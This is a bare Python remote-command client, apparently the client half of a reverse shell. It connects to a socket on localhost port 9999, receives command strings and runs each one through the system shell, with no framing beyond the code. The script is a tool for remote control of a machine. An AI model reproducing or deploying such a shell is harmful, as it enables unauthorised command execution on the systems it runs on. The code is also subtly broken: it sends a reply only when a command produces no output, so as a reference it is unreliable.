import socket
import os
import subprocess


client = socket.socket()
host = '127.0.0.1'
port = 9999
client.connect((host, port))

msg = client.recv(1024).decode()
print('[*] Server: ',msg)

while True:
    cmd = client.recv(1024).decode()
    print(f'[+] Received command: {cmd}')
    if cmd.lower() in ['quit','exit','x','q']:
        break
    
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()
    
    if len(result) == 0:
        result = '[+] Executed successfully'.encode()
        client.send(result)
        
        
client.close()
        